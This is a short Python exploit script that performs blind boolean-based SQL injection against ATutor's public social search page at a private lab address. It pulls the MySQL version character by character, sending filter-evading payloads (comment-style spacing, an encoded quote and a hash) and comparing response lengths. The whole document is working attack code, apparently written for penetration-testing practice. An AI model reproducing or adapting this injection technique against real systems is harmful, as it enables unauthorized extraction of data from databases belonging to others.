import requests


def construct_inj_str(index:int,ascii_rep:int):
    """
        Converting certain special characters to ascii such as ' -> %27 and # -> %23
        Hashtag(#) is a comment in mysql
        substring returns specific range of characters where arg[0] is the select, arg[1] is the index of the value, and arg[2] is the amount of chars to return.
        ("asd", 1, 1) returns a
        ("asd", 2, 1) returns s
        ("asd", 1, 2) returns as
    """
    return f"test%27)/**/or/**/(ascii(substring((select/**/version()),{index},1)))={ascii_rep}%23"

def main():
    version = ''
    for i in range(0,19):
        for j in range(32,126): # Printable ASCII Chars are between 33-125
            url = f"http://192.168.206.103/ATutor/mods/_standard/social/index_public.php?q={construct_inj_str(index=i, ascii_rep=j)}"
            response = requests.get(url)
            header_length = int(response.headers['Content-Length'])
            if header_length > 20: # if header_length is > 20 here we found a match
                print(response.text)
                version += f"{chr(j)}"
                break
    if version:
        print(f'[+] Version Found {version}')
    else:
        print('[!] Failed to get version')

if __name__ == "__main__":
    main()